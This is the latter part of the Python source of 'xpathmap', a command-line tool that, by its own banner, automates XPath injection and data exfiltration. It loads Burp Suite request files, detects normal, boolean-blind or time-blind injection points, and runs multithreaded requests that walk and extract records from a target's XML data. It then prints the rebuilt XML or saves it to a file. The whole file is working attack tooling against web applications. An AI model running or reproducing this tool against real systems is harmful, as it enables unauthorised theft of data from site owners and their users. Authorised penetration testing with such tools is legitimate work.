    info(f"Running NORMAL exfiltration | inj='{ctx.inj_param}' node='{ctx.node_param}' field='{ctx.field_name}'")

    # Calibrate extractor
    info("Calibrating response extractor...")
    null_html = engine.send_text({ctx.inj_param: ctx.null_payload})
    calibrated = False
    for ds in range(1, 3):
        for extra in range(1, max_depth + 1):
            indices   = [1, ds] + [1] * extra
            data_html = probe_raw(engine, ctx.inj_param, ctx.null_payload,
                                  ctx.node_param, ctx.field_name, indices)
            for pattern in ResponseExtractor.RESULT_PATTERNS:
                m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
                if m:
                    known = m.group(1).strip()
                    if known and "no result" not in known.lower() and len(known) < 200:
                        calibrated = extractor.calibrate(null_html, data_html, known)
                        break
            if calibrated:
                break
        if calibrated:
            break

    if not calibrated:
        extractor._mode         = "strip_diff"
        extractor._null_stripped = ResponseExtractor._strip_html(null_html)

    all_data: dict[int, list[list[str]]] = {}
    consecutive_empty = 0

    for ds_idx in range(1, max_datasets + 1):
        print()
        info(f"Scanning dataset /*[1]/*[{ds_idx}] ...")

        first_path = find_data_path(
            engine, ctx.inj_param, ctx.null_payload,
            ctx.node_param, ctx.field_name,
            [1, ds_idx], extractor, max_depth, max_siblings,
        )
        if first_path is None:
            warn(f"    Dataset /*[1]/*[{ds_idx}] not found.")
            consecutive_empty += 1
            if consecutive_empty >= 2:
                info("Two consecutive empty datasets — stopping.")
                break
            continue

        info(f"    First data path: {build_path(first_path)}")
        if len(first_path) < 4:
            continue

        record_paths = collect_all_record_paths(
            engine, ctx.inj_param, ctx.null_payload,
            ctx.node_param, ctx.field_name,
            first_path, extractor, max_siblings, max_records,
        )
        info(f"    Records to fetch: {len(record_paths)}")

        records_map: dict[int, list[str]] = {}
        lock    = Lock()
        counter = [0]

        def fetch(idx_path: tuple[int, list[int]]) -> tuple[int, list[str]]:
            order, rpath = idx_path
            rec = exfiltrate_record_normal(
                engine, ctx.inj_param, ctx.null_payload,
                ctx.node_param, ctx.field_name,
                rpath, extractor, max_fields,
            )
            return order, rec

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(fetch, (i, p)): i
                for i, p in enumerate(record_paths)
            }
            for future in as_completed(futures):
                order, rec = future.result()
                if rec:
                    with lock:
                        records_map[order] = rec
                        counter[0] += 1
                        found(f"Record {counter[0]:>4} {build_path(record_paths[order])}: {' | '.join(rec)}")

        records = [records_map[i] for i in sorted(records_map)]
        if records:
            all_data[ds_idx] = records
            consecutive_empty = 0
        else:
            consecutive_empty += 1
            if consecutive_empty >= 2:
                info("Two consecutive empty datasets — stopping.")
                break

    return all_data


# ──────────────────────────────────────────────────────────────────────────────
# XML output
# ──────────────────────────────────────────────────────────────────────────────

def build_xml_normal(data: dict[int, list[list[str]]], field_name: str) -> str:
    root = ET.Element("root")
    for ds_idx, records in data.items():
        ds_el = ET.SubElement(root, f"dataset_{ds_idx}")
        n_fields = max((len(r) for r in records), default=0)
        field_names = [field_name if i == 0 else f"field_{i+1}" for i in range(n_fields)]
        for rec_idx, record in enumerate(records, 1):
            rec_el = ET.SubElement(ds_el, "record")
            rec_el.set("index", str(rec_idx))
            for fi, value in enumerate(record):
                fname = field_names[fi] if fi < len(field_names) else f"field_{fi+1}"
                ET.SubElement(rec_el, fname).text = value
    return _pretty_xml(root)


def build_xml_blind(data: dict[str, list[dict]]) -> str:
    root = ET.Element("root")
    for path, records in data.items():
        safe_tag = path.strip("/").replace("/", "_").replace("[", "").replace("]", "")
        ds_el = ET.SubElement(root, safe_tag or "dataset")
        for rec_idx, record in enumerate(records, 1):
            rec_el = ET.SubElement(ds_el, "record")
            rec_el.set("index", str(rec_idx))
            for field, value in record.items():
                ET.SubElement(rec_el, field).text = value
    return _pretty_xml(root)


def _pretty_xml(root: ET.Element) -> str:
    raw = ET.tostring(root, encoding="unicode")
    try:
        pretty = xml.dom.minidom.parseString(raw).toprettyxml(indent="  ")
        lines  = pretty.splitlines()[1:]
        return "\n".join(lines)
    except Exception:
        return raw


# ──────────────────────────────────────────────────────────────────────────────
# Output
# ──────────────────────────────────────────────────────────────────────────────

def print_summary(data, xml_str: Optional[str] = None):
    print()
    print(f"{C.BOLD}{'='*60}{C.RESET}")
    print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
    print(f"{C.BOLD}{'='*60}{C.RESET}")

    if isinstance(data, dict) and data:
        # Normal mode: {ds_idx: [[fields]]}
        if all(isinstance(k, int) for k in data):
            total = sum(len(v) for v in data.values())
            print(f"  Datasets: {len(data)}   Total records: {total}")
            for ds_idx, records in data.items():
                print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
                print(f"  {'-'*50}")
                for i, rec in enumerate(records, 1):
                    print(f"    [{i:>4}]  {' | '.join(rec)}")
        # Blind mode: {xpath_path: [{field: val}]}
        else:
            for path, records in data.items():
                print(f"\n  {C.CYAN}{path}{C.RESET}  —  {len(records)} records")
                print(f"  {'-'*50}")
                for i, rec in enumerate(records, 1):
                    vals = " | ".join(f"{k}={v}" for k, v in rec.items())
                    print(f"    [{i:>4}]  {vals}")
    elif isinstance(data, list):
        for i, item in enumerate(data, 1):
            print(f"  [{i:>4}]  {item}")
    else:
        warn("No data extracted.")

    if xml_str:
        print(f"\n{C.CYAN}{'─'*60}{C.RESET}")
        print(f"{C.CYAN}  RECONSTRUCTED XML{C.RESET}")
        print(f"{C.CYAN}{'─'*60}{C.RESET}")
        print(xml_str)

    print(f"{C.BOLD}{'='*60}{C.RESET}")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
   ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
{C.GRAY}  Techniques: normal | boolean-blind | time-based-blind{C.RESET}
"""


def parse_args():
    p = argparse.ArgumentParser(
        description="xpathmap — XPath injection tool (reads Burp request files)"
    )
    p.add_argument("-r", "--request",  required=True,
                   help="Path to raw Burp Suite HTTP request file")
    p.add_argument("-v", "--verbose",  action="store_true")

    # Technique
    p.add_argument("--technique", choices=["auto", "normal", "boolean", "time"],
                   default="auto",
                   help="Injection technique (default: auto-detect)")

    # Override detection
    p.add_argument("--injectable-param", default=None,
                   help="Force injectable parameter (e.g. q or username)")
    p.add_argument("--node-param",       default=None,
                   help="Force node-selection parameter (normal mode, e.g. f)")
    p.add_argument("--field",            default=None,
                   help="XPath field name in node param (e.g. streetname)")
    p.add_argument("--null-payload",     default=None,
                   help="Force null/false payload")
    p.add_argument("--true-marker",      default=None,
                   help="String in response that indicates TRUE (boolean mode)")
    p.add_argument("--false-marker",     default=None,
                   help="String in response that indicates FALSE (boolean mode)")
    p.add_argument("--time-threshold",   type=float, default=None,
                   help="Response time threshold in seconds (time mode)")

    # Output
    p.add_argument("--xml",  default=None, metavar="FILE",
                   help="Save reconstructed XML to file")
    p.add_argument("--result-start", default=None,
                   help="Regex start of result value (normal mode)")
    p.add_argument("--result-end",   default=None,
                   help="Regex end of result value (normal mode)")

    # Tuning
    p.add_argument("--delay",          type=float, default=0.1)
    p.add_argument("--proxy",          default=None)
    p.add_argument("--timeout",        type=int,   default=15)
    p.add_argument("--threads",        type=int,   default=5,
                   help="Parallel threads for record fetching (default: 5)")
    p.add_argument("--max-datasets",   type=int,   default=6)
    p.add_argument("--max-depth",      type=int,   default=8)
    p.add_argument("--max-records",    type=int,   default=500)
    p.add_argument("--max-fields",     type=int,   default=20)
    p.add_argument("--max-siblings",   type=int,   default=20)
    p.add_argument("--time-samples",   type=int,   default=5,
                   help="Requests per timing measurement (time mode, default: 5)")
    p.add_argument("--max-blind-records", type=int, default=50,
                   help="Max records per node in blind mode (default: 50)")
    return p.parse_args()


def main():
    global VERBOSE

    print(BANNER)
    args    = parse_args()
    VERBOSE = args.verbose

    info(f"Loading request: {args.request}")
    req = parse_burp_request(args.request)
    info(f"Target  : {req.url}")
    info(f"Method  : {req.method}")
    info(f"Params  : {list(req.all_params.keys())}")

    if not req.all_params:
        error("No parameters found.")
        sys.exit(1)

    proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
    all_params = list(req.all_params.keys())
    inj_candidates = ([args.injectable_param] if args.injectable_param else all_params)

    # ── Custom regex for normal mode ──────────────────────────────────────────
    if args.result_start or args.result_end:
        custom = f"{args.result_start or ''}(.+?){args.result_end or ''}"
        ResponseExtractor.RESULT_PATTERNS.insert(0, custom)
        info(f"Custom result pattern: {custom!r}")

    # ── Handle fully-forced context (skip all detection) ─────────────────────
    ctx: Optional[InjectionContext] = None

    if args.injectable_param and args.null_payload and args.technique != "auto":
        tech = args.technique
        ctx  = InjectionContext(
            technique=tech,
            inj_param=args.injectable_param,
            null_payload=args.null_payload,
            node_param=args.node_param  or "",
            field_name=args.field       or "",
            true_marker=args.true_marker   or "",
            false_marker=args.false_marker or "",
            time_threshold=args.time_threshold or 0.0,
        )
        success(f"Using forced context: technique={tech} inj='{ctx.inj_param}'")
    else:
        force_tech = None if args.technique == "auto" else args.technique
        ctx = auto_detect_technique(engine, inj_candidates, force_technique=force_tech)

    if ctx is None:
        error(
            "Could not detect any XPath injection.\n"
            "  Tips:\n"
            "    -v  for verbose output\n"
            "    --injectable-param username --technique boolean\n"
            "    --injectable-param q --node-param f --field streetname --technique normal\n"
        )
        sys.exit(1)

    # ── Run appropriate technique ─────────────────────────────────────────────
    print()
    info(f"Technique: {C.BOLD}{ctx.technique.upper()}{C.RESET}  param='{ctx.inj_param}'")
    xml_str = None
    data    = None

    if ctx.technique == "normal":
        # Ensure we have node_param and field_name
        if not ctx.node_param:
            node_candidates = [p for p in all_params if p != ctx.inj_param]
            ctx.node_param, ctx.field_name = _find_node_param(
                engine, ctx.inj_param, ctx.null_payload, node_candidates
            )
            if not ctx.node_param and node_candidates:
                ctx.node_param = node_candidates[0]
                ctx.field_name = (engine.req.params.get(ctx.node_param) or
                                  engine.req.body_params.get(ctx.node_param, "text()"))
        if args.field:
            ctx.field_name = args.field
        if args.node_param:
            ctx.node_param = args.node_param

        re_extractor = ResponseExtractor()
        data    = run_normal(
            engine, ctx, re_extractor,
            args.max_datasets, args.max_depth,
            args.max_records, args.max_fields,
            args.max_siblings, args.threads,
        )
        xml_str = build_xml_normal(data, ctx.field_name) if data else None

    elif ctx.technique in ("boolean", "time"):
        oracle    = Oracle(engine, ctx)
        bextract  = BlindExtractor(oracle, threads=args.threads)

        # Verify oracle before starting
        info("Verifying oracle reliability...")
        if not bextract.verify_oracle():
            warn("Oracle unreliable — results may be wrong. Try -v to debug.")

        # Schema exfiltration
        schema = blind_exfiltrate_schema(bextract, max_depth=args.max_depth)
        print()
        info("Discovered schema:")
        print_schema(schema)

        # Data exfiltration
        print()
        data    = blind_exfiltrate_data(bextract, schema, max_records=args.max_blind_records)
        xml_str = build_xml_blind(data) if data else None

    # ── Output ────────────────────────────────────────────────────────────────
    print_summary(data, xml_str if not args.xml else None)

    if args.xml and xml_str:
        with open(args.xml, "w") as fh:
            fh.write(xml_str)
        success(f"XML saved to: {args.xml}")
    elif args.xml and not xml_str:
        warn("No data to save.")


if __name__ == "__main__":
    main()
